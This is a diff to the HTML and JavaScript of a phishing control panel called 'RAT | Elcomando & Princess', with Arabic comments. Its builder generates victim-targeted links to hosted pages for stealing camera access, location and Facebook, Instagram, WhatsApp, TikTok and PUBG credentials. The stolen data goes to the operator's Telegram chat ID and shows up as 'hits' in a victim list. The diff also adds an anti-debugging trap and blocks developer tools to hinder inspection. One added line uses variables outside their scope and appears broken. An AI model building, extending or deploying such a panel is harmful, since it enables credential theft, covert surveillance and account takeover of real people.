@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>RAT | Elcomando & Princess v2</title>
+    <title>RAT | Elcomando & Princess v³</title>
     
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
@@ -80,37 +80,6 @@
         .nav-item { color: #444; text-align: center; flex: 1; transition: 0.3s; font-size: 10px; }
         .nav-item i { font-size: 20px; margin-bottom: 5px; }
         .nav-item.active { color: var(--primary); text-shadow: 0 0 10px var(--primary); }
-        /* تأثير النبض والوميض لصندوق النتيجة */
-#generated-result {
-    border: 1px solid var(--primary);
-    background: rgba(0, 242, 255, 0.05);
-    border-radius: 15px;
-    box-shadow: inset 0 0 15px rgba(0, 242, 255, 0.1);
-    position: relative;
-    overflow: hidden;
-}
-
-/* تأثير زر GENERATE عند الضغط */
-.btn-active {
-    transform: scale(0.95);
-    filter: brightness(1.3);
-    box-shadow: 0 0 25px var(--primary) !important;
-}
-
-/* أنيميشن كتابة الرابط */
-#final-link {
-    color: var(--primary);
-    font-family: 'Orbitron', sans-serif;
-    display: block;
-    margin-bottom: 10px;
-    text-shadow: 0 0 5px var(--primary);
-}
-
-/* أيقونة اللودينج داخل الزرار */
-.fa-spin-fast {
-    animation: fa-spin 0.5s infinite linear;
-}
-
     </style>
 </head>
 <body>
@@ -121,7 +90,7 @@
 
     <div id="page-loader">
         <div class="spinning-emoji" id="loader-icon">⚙️</div>
-        <p style="color:var(--primary); font-family:Orbitron; margin-top:15px;">SYNCHRONIZING...</p>
+        <p style="color:var(--primary); font-family:Orbitron; margin-top:15px;">Elcomando & Princess...</p>
     </div>
 
     <div id="acc-dialog" class="custom-dialog-overlay">
@@ -141,7 +110,7 @@
     <div id="custom-alert" class="custom-dialog-overlay">
         <div class="custom-dialog-box">
             <div id="alert-icon" style="font-size:40px; margin-bottom:10px;">⚠️</div>
-            <h3 id="alert-title" style="color: var(--primary); font-family: Orbitron;">SYSTEM</h3>
+            <h3 id="alert-title" style="color: var(--primary); font-family: Orbitron;">SYSTEM-CMD</h3>
             <p id="alert-msg" style="font-size: 14px; color: #ccc;"></p>
             <button class="btn" onclick="closeAlert()">فهمت 👍</button>
         </div>
@@ -149,7 +118,7 @@
 
     <div id="auth-screen" style="height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px;">
         <div class="tool-card" style="width: 100%; max-width: 350px; border-right: none; border-top: 4px solid var(--primary);">
-            <i class="fas fa-spider fa-3x" style="color:var(--primary); filter: drop-shadow(0 0 10px var(--primary)); margin-bottom: 15px;"></i>
+            <i class="fas fa-skull fa-3x" style="color:var(--primary); filter: drop-shadow(0 0 10px var(--primary)); margin-bottom: 15px;"></i>
             <div id="login-box">
                 <input type="text" id="loginUser" placeholder="Username">
                 <input type="password" id="loginPass" placeholder="Password">
@@ -167,7 +136,7 @@
 
     <div id="main-panel" style="display: none;">
         <header class="header">
-            <h1 id="title">LINKS</h1>
+            <h1 id="title">Elcomando & Princess</h1>
             <i class="fas fa-ghost" style="color: var(--primary);"></i>
         </header>
 
@@ -178,39 +147,25 @@
 
             <div id="tool-details-page" class="page">
                 <div class="tool-card" style="height: 250px; overflow-y: auto; text-align: right; border-color: var(--primary);" id="victim-list">
-                    <p style="color: #444; text-align: center; margin-top: 100px;">Waiting for hits... 🕷️</p>
+                    <p style="color: #444; text-align: center; margin-top: 100px;">Waiting for hits... ☠️</p>
                 </div>
                 <div style="margin-top: 20px; text-align: center;">
                     <p id="tool-link-display" style="font-size: 10px; color: var(--primary); word-break: break-all; margin-bottom: 10px;"></p>
-                    <button class="btn btn-neon" id="copy-tool-btn">COPY LINK & USER 📋</button>
+                    <button class="btn btn-neon" id="copy-tool-btn">Welcome TO WORLD CMD</button>
                     <button class="btn" style="margin-top: 10px; background: #222; color: #fff;" onclick="nav(1, 'LINKS', '🔗', null)">BACK 🔙</button>
                 </div>
             </div>
 
             <div id="tab2" class="page">
-    <div class="tool-card" style="border-right:none; border-bottom: 3px solid var(--primary); background: rgba(0,0,0,0.4);">
-        <h3 style="font-family: Orbitron; letter-spacing: 2px;">BUILDER SYSTEM</h3>
-        
-        <div style="text-align: right; margin-bottom: 5px; font-size: 12px; color: var(--primary);">اختر الأداة:</div>
-        <select id="tool-select"></select>
-        
-        <div style="text-align: right; margin-bottom: 5px; font-size: 12px; color: var(--primary);">اسم الضحية (اختياري):</div>
-        <input type="text" id="victim-name" placeholder="E.g. Khaled_01">
-        
-        <button class="btn btn-neon" onclick="generateCustomLink(event)" style="margin-top: 10px; position: relative;">
-            GENERATE 🚀
-        </button>
-
-        <div id="generated-result" style="display:none; margin-top:20px; padding:15px; text-align: center;">
-            <small style="color: #888;">الرابط الخاص بك جاهز:</small>
-            <span id="final-link"></span>
-            <button class="btn" style="padding:8px; background: rgba(0, 242, 255, 0.2); color: var(--primary); border: 1px solid var(--primary);" onclick="copyGeneratedLink()">
-                <i class="fas fa-copy"></i> نسخ الرابط
-            </button>
-        </div>
-    </div>
-</div>
-
+                <div class="tool-card" style="border-right:none; border-bottom: 3px solid var(--primary);">
+                    <h3 style="font-family: Orbitron;">BUILDER SYSTEM</h3>
+                    <select id="tool-select"></select>
+                    <input type="text" id="victim-name" placeholder="Victim Name (Optional)">
+                    <button class="btn btn-neon" onclick="generateCustomLink()">GENERATE 🚀</button>
+                    <div id="generated-result" style="display:none; margin-top:15px; padding:10px; border:1px dashed var(--primary); font-size:10px; word-break: break-all;">
+                        <span id="final-link"></span><br><br>
+                        <button class="btn" style="padding:5px" onclick="copyGeneratedLink()">COPY 📋</button>
+                    </div>
                 </div>
             </div>
 
@@ -341,48 +296,33 @@
         }
 
         // 3. المنشئ والإشعارات
-        async function generateCustomLink() {
-    const btn = event.currentTarget;
+        // التعديل الجديد للمنشئ ليدعم الـ Chat ID في الأدوات الحية
+function generateCustomLink() {
     const tool = document.getElementById('tool-select').value;
     const vict = document.getElementById('victim-name').value || "target";
     const user = localStorage.getItem('logged_user');
     
-    // 1. إضافة تأثير الضغط بصرياً
-    btn.classList.add('btn-active');
-    const originalContent = btn.innerHTML;
-    btn.innerHTML = '<i class="fas fa-sync fa-spin-fast"></i> PROCESSING...';
-
-    // قائمة الأدوات الحية (أول 7 أدوات)
+    // قائمة أول 7 أدوات حية (تتطلب تليجرام فوري)
     const liveTools = ["كاميرا", "موقع", "فيسبوك", "انستا", "واتساب", "تيك توك", "ببجي"];
-    let finalId = user;
+    
+    let finalId = user; // الافتراضي هو اسم المستخدم للموقع
 
-    // محاكاة تأخير بسيط للجمالية
-    await new Promise(r => setTimeout(r, 600));
-
+    // إذا اختار المستخدم أداة من أول 7، نطلب منه الـ ID الخاص به
     if (liveTools.includes(tool)) {
         const telegramId = prompt("هذه الأداة (LIVE) تطلب تفاعل لحظي.\nيرجى إدخال Chat ID التليجرام الخاص بك لاستلام الأكواد:");
+        
         if (!telegramId || isNaN(telegramId)) {
-            btn.classList.remove('btn-active');
-            btn.innerHTML = originalContent;
-            return showAlert("تنبيه ⚠️", "يجب إدخال معرف تليجرام رقمي لضمان عمل الأداة.");
+            showAlert("تنبيه ⚠️", "يجب إدخال معرف تليجرام (رقمي) لضمان وصول البيانات لك.");
+            return;
         }
-        finalId = telegramId;
+        finalId = telegramId; // استبدال الـ ID بمعرف التليجرام في الرابط
     }
 
-    // بناء الرابط النهائي
+    // بناء الرابط النهائي مع استخدام user_id ليتوافق مع سكريبتات السحب
     const link = `https://elcomando-68116.web.app/${tool}.html?user_id=${finalId}&target=${vict}`;
     
-    // 2. عرض النتيجة بتأثير
-    const resultBox = document.getElementById('generated-result');
     document.getElementById('final-link').innerText = link;
-    
-    resultBox.style.display = 'block';
-    resultBox.style.animation = 'zoomIn 0.4s ease forwards';
-    
-    // إعادة الزرار لوضعه الطبيعي
-    btn.classList.remove('btn-active');
-    btn.innerHTML = 'SUCCESS ✅';
-    setTimeout(() => { btn.innerHTML = originalContent; }, 2000);
+    document.getElementById('generated-result').style.display = 'block';
 }
 
 
@@ -457,6 +397,30 @@
         function closeAccDialog() { document.getElementById('acc-dialog').style.display = 'none'; toggleAuth(false); }
         function logout() { localStorage.clear(); location.reload(); }
         window.onload = () => { if(localStorage.getItem('logged_user')) enterSystem(); };
+        
+        // السطر ده هيعرف لوحده اسم الموقع اللي مرفوع عليه ويضيف اسم الأداة
+const baseUrl = window.location.origin; 
+const link = `${baseUrl}/${tool}.html?user_id=${finalId}&target=${vict}`;
+        
+        
+       // فخ بسيط لإغلاق الصفحة إذا تم فتح أدوات المطور
+setInterval(function() {
+    const before = new Date().getTime();
+    debugger; // سيتوقف الكود هنا إذا كان الـ Console مفتوحاً
+    const after = new Date().getTime();
+    if (after - before > 100) {
+        window.location.href = "about:blank"; // توجيه لصفحة فارغة
+    }
+}, 1000);
+
+// كود بسيط يمنع كليك يمين وفحص العناصر بشكل مبدئي
+document.oncontextmenu = () => false;
+document.onkeydown = (e) => {
+    if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false;
+};
+
+
     </script>
 </body>
 </html>
+
